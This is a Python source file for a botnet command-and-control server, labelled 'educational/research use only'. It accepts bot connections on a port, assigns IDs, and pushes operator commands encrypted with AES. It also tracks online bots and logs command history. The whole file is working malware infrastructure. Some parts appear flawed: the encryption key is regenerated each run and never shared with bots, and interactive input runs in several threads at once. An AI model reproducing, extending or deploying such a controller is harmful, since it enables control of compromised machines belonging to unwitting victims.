#!/usr/bin/env python3
"""
Botnet Controller (Educational/Research Use Only)

- Handles multiple bot connections with threading
- Uses AES encryption for command transmission
- Tracks active bots and execution history
- Logs events with timestamps

Author: Jon Constantine
"""

import socket
import threading
import time
import json
import hashlib
import os
import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Change this key for each deployment
KEY = get_random_bytes(16)


def encrypt(data: bytes) -> bytes:
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ct_bytes


def decrypt(data: bytes) -> bytes:
    iv = data[:16]
    ct = data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt


def log_event(message: str):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")


class BotnetController:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.online_bots = set()
        self.bot_history = []
        self.lock = threading.Lock()

    def handle_client(self, client_socket, address):
        try:
            welcome_msg = '[+] Welcome to botnet controller!'
            client_socket.send(welcome_msg.encode())

            # Simple bot ID using hash of IP address
            bot_id = hashlib.sha256(address[0].encode()).hexdigest()[:8]
            reg_msg = f'Registered bot: {bot_id}'
            client_socket.send(reg_msg.encode())

            with self.lock:
                self.online_bots.add((bot_id, address[0]))

            while True:
                cmd = input(f"{bot_id}> ").strip()
                if not cmd or cmd.lower() == "quit":
                    break

                encrypted_cmd = encrypt(cmd.encode())
                payload = {
                    'timestamp': time.time(),
                    'cmd': encrypted_cmd.hex(),
                    'priority': hash(os.urandom(8)) % 100,
                }
                client_socket.send(json.dumps(payload).encode())

                # Track command execution
                if cmd.startswith("!"):
                    with self.lock:
                        self.bot_history.append({
                            'id': bot_id,
                            'cmd': cmd,
                            'time': datetime.datetime.now().isoformat()
                        })
        except Exception as e:
            log_event(f"[ERROR] {address}: {e}")
        finally:
            client_socket.close()
            with self.lock:
                self.online_bots = {
                    b for b in self.online_bots if b[1] != address[0]
                }
            log_event(f"Connection closed: {address[0]}")

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((self.host, self.port))
            server.listen(5)
            log_event(f"[*] Listening on {self.host}:{self.port}")

            while True:
                try:
                    conn, addr = server.accept()
                    log_event(f"Connection from {addr[0]}:{addr[1]}")
                    handler = threading.Thread(
                        target=self.handle_client,
                        args=(conn, addr),
                        daemon=True
                    )
                    handler.start()
                except socket.error as e:
                    if str(e) != "socket has been closed":
                        log_event(f"[SOCKET ERROR]: {e}")
        except KeyboardInterrupt:
            log_event("[SHUTDOWN]")
        finally:
            server.close()


if __name__ == "__main__":
    controller = BotnetController()
    controller.start()
